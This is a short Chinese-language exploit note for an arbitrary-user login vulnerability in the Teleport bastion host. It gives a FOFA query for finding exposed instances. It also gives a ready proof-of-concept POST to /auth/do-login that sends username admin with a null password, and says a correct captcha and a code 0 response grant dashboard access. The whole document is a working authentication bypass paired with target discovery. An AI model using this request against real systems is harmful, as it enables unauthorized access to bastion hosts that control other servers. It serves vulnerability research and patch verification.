# Teleport堡垒机 do-login 任意用户登录漏洞
## 资产收集
fofa：`app="TELEPORT堡垒机"`
![](./img/login.png)
## POC
```
post:
https://{Hostname}/auth/do-login
args={"type":2,"username":"admin","password":null,"captcha":"7hly","oath":"","remember":false}
```
验证码(参数：captcha)需要填写正确的  
返回code:0访问主页`/dashboard`即可成功登陆